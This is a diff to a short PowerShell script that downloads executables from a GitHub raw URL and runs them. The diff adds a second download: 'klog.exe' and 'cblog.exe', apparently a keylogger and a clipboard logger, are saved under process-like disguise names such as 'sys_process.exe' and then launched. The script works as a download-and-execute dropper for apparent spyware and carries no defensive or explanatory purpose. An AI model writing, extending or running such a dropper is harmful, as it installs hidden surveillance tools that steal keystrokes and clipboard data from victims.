@@ -1,5 +1,9 @@
 $dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/klog.exe"
 $dlPath = Join-Path -Path $PWD.Path -ChildPath "sys_process.exe"
 Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
+$dlUrl2 = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/cblog.exe"
+$dlPath2 = Join-Path -Path $PWD.Path -ChildPath "cb_process.exe"
+Invoke-WebRequest -Uri $dlUrl2 -OutFile $dlPath2
 cd $PWD.Path
 Start-Process .\sys_process.exe
+Start-Process .\cb_process.exe
